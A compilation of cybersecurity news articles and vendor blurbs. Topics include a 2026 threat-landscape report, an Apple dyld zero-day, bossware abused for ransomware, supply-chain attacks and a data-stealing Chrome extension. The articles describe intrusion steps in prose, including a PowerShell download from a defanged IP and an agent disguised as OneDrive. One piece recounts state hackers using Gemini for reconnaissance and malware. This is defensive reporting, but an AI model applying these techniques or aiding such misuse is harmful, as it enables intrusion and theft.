Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

What 2025 teaches us about 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000
Link: https://cyberscoop.com/state-hackers-using-gemini-google-ai/

[TAM METİN - 733 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Notepad's new Markdown powers served with a side of remote code execution

Payroll pirates are conning help desks to steal workers' identities and redirect paychecks

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

Apple, Google forced to issue emergency 0-day patches

Two Android 0-day bugs disclosed and fixed, plus 105 more to patch

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[30] The Register - Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Researchers say breaches link identity abuse, SaaS compromise, and ransomware into a cascading cycle

Cybercriminals are turning supply chain attacks into an industrial-scale operation, linking breaches, credential theft, and ransomware into a "self-reinforcing" ecosystem, researchers say.

In its latest trends report, Group-IB reckons individual strikes that lead to broader downstream compromises of businesses are now interconnected as cyberbaddies pursue multiple methods to breach vendors and service providers.

Supply chain hacks like the recent Shai-Hulud NPM worm, Salesloft debacle, or the OpenClaw package poisoning are fast becoming the primary goals of the criminal fraternity who try to exploit the inherited access to a victim's customers.

"Open source package compromise feeds malware distribution and credential theft," the research states. "Phishing and OAuth abuse enable identity compromise that unlocks SaaS and CI/CD environments. Data breaches supply the credentials, context, and relationships needed to refine impersonation and lateral movement. Ransomware and extortion arrive later in the chain, capitalizing on access and intelligence gathered earlier. Each stage strengthens the next, creating a self-reinforcing cycle of supply chain exploitation."

Over the next year, GroupIB predicts supply chain attacks will be executed faster thanks to AI-assisted tools that can scan for vulnerabilities across vendors, CI/CD pipelines, and browser extension marketplaces at machine speed.

It also expects to see traditional malware replaced by identity attacks, whereby criminals set themselves up as genuine users and their activity blends into the normal daily business functions, evading detection for longer periods.

Platforms offering HR, CRM, and ERP, as well as MSPs, are high-priority targets, Group-IB says, as a single compromise can lead to hackers gaining access to hundreds of customers.

Evolution of data breaches

The Salesloft breach, as well as the Oracle compromise of March 2025, are examples of how data breaches are shifting from a single-reward model to one where access is used for additional compromises.

Instead of taking one big wedge of data and demanding an extortion payment, criminals took their time to collect OAuth tokens and exploit misconfigured partner connections to move laterally. They then target downstream customers, steal their data and contact lists to repeat the cycle, or, in cases involving NPM and similar ecosystems, serve malicious updates to users to carry out fraud at scale.

"Cybercrime is no longer defined by single breaches. It is defined by cascading failures of trust," said Dmitry Volkov, Group-IB CEO.

"Attackers are industrializing supply chain compromise because it delivers scale, speed, and stealth. A single upstream breach can now ripple across entire industries. Defenders must stop thinking in terms of isolated systems and start securing trust itself, across every relationship, identity, and dependency."

Organizations should treat third parties as extensions of their own attack surface.

"Strategic investments in supply chain threat modeling, automated dependency checks, and data flow visibility are no longer optional – they are foundational to modern security architecture," said Volkov. ®

[1] The Hacker News - Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:55:00 +0530

[TAM METİN - 1367 kelime]
Cybersecurity researchers have discovered a malicious Google Chrome extension that's designed to steal data associated with Meta Business Suite and Facebook Business Manager.

The extension, named CL Suite by @CLMasters (ID: jkphinfhmfkckkcnifhjiplhfoiefffl), is marketed as a way to scrape Meta Business Suite data, remove verification pop-ups, and generate two-factor authentication (2FA) codes. The extension has 33 users as of writing. It was first uploaded to the Chrome Web Store on March 1, 2025.

However, the browser add-on also exfiltrates TOTP codes for Facebook and Meta Business accounts, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor, Socket said.

"The extension requests broad access to meta.com and facebook.com and claims in its privacy policy that 2FA secrets and Business Manager data remain local," security researcher Kirill Boychenko said.

"In practice, the code transmits TOTP seeds and current one-time security codes, Meta Business 'People' CSV exports, and Business Manager analytics data to a backend at getauth[.]pro, with an option to forward the same payloads to a Telegram channel controlled by the threat actor."

By targeting users of Meta Business Suite and Facebook Business Manager, the threat actor behind the operation has leveraged the extension to conduct data collection and exfiltration without users' knowledge or consent.

While the extension does not have capabilities to steal password-related information, the attacker could obtain such information beforehand from other sources, such as infostealer logs or credential dumps, and then use the stolen codes to gain unauthorized access to victims' accounts.

The full scope of the malicious add-on's capabilities is listed below -

Steal TOTP seed (a unique, alphanumeric code that's used to generate time-based one-time passwords) and 2FA code

Target Business Manager "People" view by navigating to facebook[.]com and meta[.]com and build a CSV file with names, email addresses, roles and permissions, and their status and access details.

Enumerate Business Manager-level entities and their linked assets and build a CSV file of Business Manager IDs and names, attached ad accounts, connected pages and assets, and billing and payment configuration details.

Socket warned that despite the low number of installs, the extension gives the threat actor enough information to identify high-value targets and mount follow-on attacks.

"CL Suite by @CLMasters shows how a narrow browser extension can repackage data scraping as a 'tool' for Meta Business Suite and Facebook Business Manager," Boychenko said.

"Its people extraction, Business Manager analytics, popup suppression, and in-browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages."

Chrome Extensions Hijack VKontakte Accounts

The disclosure comes as Koi Security found that about 500,000 VKontakte users have had their accounts silently hijacked through Chrome extensions masquerading as VK customization tools. The large-scale campaign has been codenamed VK Styles.

